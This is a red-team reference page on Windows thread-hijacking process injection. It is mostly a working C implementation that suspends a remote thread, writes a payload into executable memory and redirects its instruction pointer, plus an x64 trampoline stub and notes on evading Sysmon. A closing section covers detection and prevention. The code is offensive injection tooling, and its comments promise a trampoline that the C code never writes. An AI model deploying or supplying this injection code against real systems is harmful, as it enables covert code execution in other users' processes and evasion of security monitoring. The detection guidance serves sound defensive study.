# Thread Hijacking (Context Injection)

**MITRE ATT&CK**: T1055 - Process Injection

> **Authorized security testing only.** These code patterns are reference material
> for red team professionals operating under explicit written authorization.

## Overview

Thread hijacking redirects the execution of an existing thread in a remote process
without creating a new thread or queuing an APC. The attacker suspends a target thread,
reads its CPU register state (CONTEXT), modifies the instruction pointer (RIP on x64)
to point to injected code, and resumes the thread.

This technique avoids CreateRemoteThread and QueueUserAPC, making it harder to detect
with standard Sysmon rules. However, it requires careful handling to avoid crashing
the target process -- the original thread context must be preserved and restored.

## API Call Pattern

```
OpenProcess + OpenThread
    --> SuspendThread (pause target thread)
    --> GetThreadContext (read current CPU state: RIP, RSP, registers)
    --> VirtualAllocEx + WriteProcessMemory (inject payload + trampoline)
    --> SetThreadContext (redirect RIP to payload)
    --> ResumeThread (thread resumes at payload instead of original location)
```

## The CONTEXT Structure (x64)

```c
/*
 * The CONTEXT structure holds the complete CPU register state for a thread.
 * On x64 Windows, key fields include:
 *
 *   Rip - Instruction pointer (where the thread will execute next)
 *   Rsp - Stack pointer
 *   Rax..R15 - General purpose registers
 *   SegCs, SegDs, etc. - Segment registers
 *   EFlags - Processor flags
 *
 * ContextFlags controls which register groups are read/written:
 *   CONTEXT_CONTROL  - Rip, Rsp, SegCs, SegSs, EFlags
 *   CONTEXT_INTEGER  - Rax, Rbx, Rcx, Rdx, Rsi, Rdi, R8-R15
 *   CONTEXT_FULL     - CONTEXT_CONTROL | CONTEXT_INTEGER | CONTEXT_FLOATING_POINT
 */

// Simplified view of key x64 CONTEXT fields:
typedef struct _CONTEXT {
    DWORD64 ContextFlags;
    // ... debug registers ...
    // ... segment registers ...
    DWORD64 Rax, Rcx, Rdx, Rbx;
    DWORD64 Rsp, Rbp, Rsi, Rdi;
    DWORD64 R8, R9, R10, R11, R12, R13, R14, R15;
    DWORD64 Rip;           // <-- This is what we modify
    // ... floating point, vector registers ...
} CONTEXT;
```

## C Implementation

```c
#include <windows.h>
#include <stdio.h>

/*
 * Thread hijacking injection.
 *
 * The trampoline concept: We cannot simply overwrite RIP and forget
 * the original context -- the target thread was in the middle of executing
 * code. Our payload must:
 *   1. Save all registers (pushad equivalent on x64: individual pushes)
 *   2. Execute our payload logic
 *   3. Restore all registers
 *   4. Jump back to the original RIP value
 *
 * The "trampoline" is a small stub prepended to the payload that handles
 * saving/restoring context and jumping back to the original execution point.
 */

int hijack_thread(DWORD targetPid, DWORD targetTid,
                  unsigned char *payload, SIZE_T payloadSize) {

    // Open process for memory operations
    HANDLE hProcess = OpenProcess(
        PROCESS_VM_OPERATION | PROCESS_VM_WRITE, FALSE, targetPid
    );
    if (!hProcess) return -1;

    // Open the specific thread we want to hijack
    // THREAD_SUSPEND_RESUME - for SuspendThread / ResumeThread
    // THREAD_GET_CONTEXT / THREAD_SET_CONTEXT - for reading/writing registers
    HANDLE hThread = OpenThread(
        THREAD_SUSPEND_RESUME | THREAD_GET_CONTEXT | THREAD_SET_CONTEXT,
        FALSE, targetTid
    );
    if (!hThread) {
        CloseHandle(hProcess);
        return -1;
    }

    // ---------------------------------------------------------------
    // STEP 1: Suspend the target thread
    // SuspendThread increments the thread's suspend count. The thread
    // stops executing at its current instruction.
    // Returns previous suspend count, or (DWORD)-1 on failure.
    // ---------------------------------------------------------------
    DWORD suspendCount = SuspendThread(hThread);
    if (suspendCount == (DWORD)-1) {
        CloseHandle(hThread);
        CloseHandle(hProcess);
        return -1;
    }

    // ---------------------------------------------------------------
    // STEP 2: Capture the current thread context (register state)
    // We need CONTEXT_FULL to get all registers including RIP.
    // The captured Rip value is where we will return after our payload.
    // ---------------------------------------------------------------
    CONTEXT ctx;
    ctx.ContextFlags = CONTEXT_FULL;

    if (!GetThreadContext(hThread, &ctx)) {
        ResumeThread(hThread);  // Don't leave thread stuck
        CloseHandle(hThread);
        CloseHandle(hProcess);
        return -1;
    }

    // Save original RIP -- we need this for the trampoline return address
    DWORD64 originalRip = ctx.Rip;

    // ---------------------------------------------------------------
    // STEP 3: Allocate memory and write payload with trampoline
    // The payload buffer structure:
    //   [trampoline stub][actual payload][original RIP value]
    // The trampoline saves registers, calls payload, restores, returns.
    // ---------------------------------------------------------------
    LPVOID remoteBuf = VirtualAllocEx(
        hProcess, NULL, payloadSize + 256,  // extra space for trampoline
        MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE
    );
    if (!remoteBuf) {
        ResumeThread(hThread);
        CloseHandle(hThread);
        CloseHandle(hProcess);
        return -1;
    }

    // Write the payload to remote memory
    WriteProcessMemory(hProcess, remoteBuf, payload, payloadSize, NULL);

    // Write the original RIP at a known offset so the payload can return
    LPVOID returnAddr = (LPVOID)((DWORD_PTR)remoteBuf + payloadSize);
    WriteProcessMemory(hProcess, returnAddr, &originalRip, sizeof(DWORD64), NULL);

    // ---------------------------------------------------------------
    // STEP 4: Modify the thread context to redirect execution
    // Set RIP to our payload. When the thread resumes, it will begin
    // executing at remoteBuf instead of its original location.
    // ---------------------------------------------------------------
    ctx.Rip = (DWORD64)remoteBuf;

    if (!SetThreadContext(hThread, &ctx)) {
        ResumeThread(hThread);
        CloseHandle(hThread);
        CloseHandle(hProcess);
        return -1;
    }

    // ---------------------------------------------------------------
    // STEP 5: Resume the thread -- it now executes our payload
    // ---------------------------------------------------------------
    ResumeThread(hThread);

    CloseHandle(hThread);
    CloseHandle(hProcess);
    return 0;
}
```

## Trampoline Stub Concept (x64 ASM)

```nasm
; Trampoline prepended to payload -- saves all registers, calls
; the actual payload, then restores registers and returns to original RIP.

trampoline:
    ; Save all general-purpose registers
    push rax
    push rbx
    push rcx
    push rdx
    push rsi
    push rdi
    push rbp
    push r8
    push r9
    push r10
    push r11
    push r12
    push r13
    push r14
    push r15
    pushfq              ; save flags

    ; Call the actual payload (relative address)
    call payload_start

    ; Restore all registers
    popfq
    pop r15
    pop r14
    pop r13
    pop r12
    pop r11
    pop r10
    pop r9
    pop r8
    pop rbp
    pop rdi
    pop rsi
    pop rdx
    pop rcx
    pop rbx
    pop rax

    ; Jump back to original RIP (stored at end of buffer)
    jmp [rel original_rip_location]
```

## Detection & Prevention

### Thread Suspension Monitoring

**SuspendThread on remote threads**: Legitimate software rarely suspends threads
in other processes. Detection rules should monitor for cross-process thread
suspension, particularly when followed by context modification.

**ETW events**: The Microsoft-Windows-Threat-Intelligence provider emits events
for NtSuspendThread and NtSetContextThread cross-process calls. This is the
primary kernel-level telemetry source.

### Context Modification Detection

**GetThreadContext / SetThreadContext sequence**: The combination of these two
calls targeting a remote thread is highly suspicious. EDRs that hook
NtGetContextThread and NtSetContextThread in ntdll can detect this pattern.

**RIP modification**: Specifically, a SetThreadContext call that changes the Rip
register to point to unbacked (non-module) memory is a high-confidence indicator
of thread hijacking.

### Behavioral Indicators

1. **Suspend-Write-Resume pattern**: A process that suspends a remote thread,
   writes to the owning process's memory, and then resumes the thread exhibits
   a clear injection pattern.

2. **Execution from unbacked memory**: After hijacking, the thread's call stack
   will show execution from memory not backed by any loaded module. EDR stack
   walking detects this.

3. **Thread state anomalies**: A thread that was executing kernel32 code suddenly
   executing from a private memory allocation indicates hijacking.

### Sysmon Limitations

Standard Sysmon configuration does NOT have a dedicated event for thread context
manipulation. Event ID 10 (ProcessAccess) captures the OpenThread/OpenProcess
calls. Advanced detection requires:
- ETW provider: Microsoft-Windows-Threat-Intelligence
- EDR kernel callbacks: PsSetCreateThreadNotifyRoutine
- Inline hooks on NtSetContextThread

### Prevention

- **Hardware-enforced Stack Protection (CET)**: Intel CET shadow stacks detect
  when the return address is manipulated, which can catch some trampoline patterns.
- **Control Flow Guard (CFG)**: Validates indirect call targets, making arbitrary
  RIP redirection harder.
- **Protected Processes**: PPL-protected processes reject thread handle acquisition
  with the required SET_CONTEXT access right.
- **Hypervisor-protected Code Integrity (HVCI)**: Prevents execution from
  writable memory pages in protected processes.
